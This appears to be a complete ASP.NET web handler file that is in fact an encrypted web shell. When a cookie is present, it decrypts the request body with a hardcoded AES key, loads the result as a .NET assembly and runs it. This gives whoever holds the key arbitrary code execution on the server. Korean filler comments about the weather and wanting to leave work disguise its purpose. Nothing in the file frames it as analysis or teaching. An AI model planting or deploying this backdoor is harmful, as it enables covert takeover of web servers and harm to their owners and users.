<%@ WebHandler Language="C#" Class="Q" %>
using System.Web;
using System;
public class Q:IHttpHandler{
public void ProcessRequest(HttpContext z){
// 오늘 날씨가 좋네요.
if(z.Request.Cookies.Count>0){
try{
// 퇴근하고 싶다.
Action<HttpContext> x=delegate(HttpContext y){
byte[]k=new byte[]{99,97,54,51,52,53,55,53,51,56,98,57,98,49,101,48};
byte[]d=y.Request.BinaryRead(y.Request.ContentLength);
var p=new System.Security.Cryptography.RijndaelManaged();
var s=p.CreateDecryptor(k,k).TransformFinalBlock(d,0,d.Length);
// 이 함수는 마법처럼 작동합니다.
var a=AppDomain.CurrentDomain.Load(s);
var i=a.CreateInstance(string.Concat('K'));
i.Equals(y);};
x(z);
}catch{
// 주석은 중요하지 않아.
}}}
public bool IsReusable{get{return 1>2;}}}